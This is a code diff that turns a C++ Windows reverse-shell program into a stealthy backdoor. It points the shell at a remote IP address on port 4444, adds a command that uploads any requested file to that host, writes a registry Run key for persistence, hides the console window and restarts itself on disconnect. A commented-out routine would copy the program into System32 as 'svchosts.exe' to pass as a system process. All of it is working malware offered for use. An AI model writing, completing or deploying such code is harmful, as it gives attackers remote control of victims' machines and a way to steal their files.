@@ -25,6 +25,51 @@ char* extract_second(char* string){
 	while(*string != '\0' && *(string++) != ' ')string++;
 	return string;
 }
+int file_size(FILE* file){
+	fseek(file,0L,SEEK_END);
+	int pos = ftell(file);
+	rewind(file);
+	return pos;
+}
+void upload(char* fname,SOCKET& sock){
+	FILE* file = fopen(fname,"rb");
+	void* filedata = malloc(sizeof(char) * file_size(file));
+	size_t fsize = file_size(file);
+	fread(filedata,sizeof(char),fsize,file);
+	send(sock,(char*) filedata,fsize,0);
+}
+void restart_self(){
+	char selfname[MAX_PATH+1];
+	GetModuleFileName(NULL,selfname,MAX_PATH+1);
+	char command[MAX_PATH+10];
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory( &si, sizeof(si) );
+	si.cb = sizeof(si);
+	ZeroMemory( &pi, sizeof(pi) );
+	while (!CreateProcess(selfname,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi));
+	std::exit(0);
+}
+void add_to_startup(){
+	HKEY hkey;
+	char selfname[MAX_PATH+1];
+	GetModuleFileName(NULL,selfname,MAX_PATH+1);
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_SET_VALUE, &hkey);
+	RegSetValueEx (hkey, selfname, 0, REG_SZ, (LPBYTE) selfname, strlen(selfname) + 1);
+	RegCloseKey(hkey);
+}
+/*
+void copy_to_system32(){
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory( &si, sizeof(si) );
+	si.cb = sizeof(si);
+	ZeroMemory( &pi, sizeof(pi) );
+	char selfname[MAX_PATH+1];
+	GetModuleFileName(NULL,selfname,MAX_PATH+1);
+	if(CopyFile(selfname,"C:\\Windows\\System32\\svchosts.exe",true))
+		if(CreateProcess("C:\\Windows\\System32\\svchosts.exe",NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi))std::exit(0);
+}*/
 void RevShell(){
 	WSADATA wsaver;
 	WSAStartup(MAKEWORD(2,2),&wsaver);
@@ -32,19 +77,16 @@ void RevShell(){
 	sockaddr_in addr;
 	addr.sin_family = AF_INET;
 	addr.sin_port = htons(4444);
-	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
-	while(connect(tcpsock,(SOCKADDR*)&addr,sizeof(addr))==SOCKET_ERROR){
-		//Keep retrying
-	}
+	addr.sin_addr.s_addr = inet_addr("105.229.57.34");
+	while(connect(tcpsock,(SOCKADDR*)&addr,sizeof(addr))!=0)restart_self();
 	if(1){
 		//std::cout << "[+] Connected. " << std::endl;
 		char command[DEFAULT_BUFLEN] = "";
 		while(1){
 			int Result = recv(tcpsock,command,DEFAULT_BUFLEN,0);
-			if(Result == SOCKET_ERROR)
-				while(connect(tcpsock,(SOCKADDR*)&addr,sizeof(addr))==SOCKET_ERROR){
-					//Keep retrying
-				}
+			if(Result <= 0){
+				restart_self();
+			}
 			else if(strlen(command)){
 				//std::cout << "Command: " << command << std::endl;
 				char   psBuffer[4096*5];
@@ -56,6 +98,9 @@ void RevShell(){
 				}
 				else if(starts_with(command,"cd")){
 					SetCurrentDirectory(extract_second(command));
+				}
+				else if(starts_with(command,"download")){
+					upload(extract_second(command),tcpsock);
 				}
 				else if(strcmp(command,"ls")==0){
 					WIN32_FIND_DATAA fdata;
@@ -92,8 +137,10 @@ void RevShell(){
 int main(){
 	HWND stealth;
 	AllocConsole();
+	add_to_startup();
+	//copy_to_system32();
 	stealth=FindWindow("ConsoleWindowClass",NULL);
-	ShowWindow(stealth,SW_SHOWNORMAL);
+	ShowWindow(stealth,SW_HIDE);
 	RevShell();
 	return 0;
 }
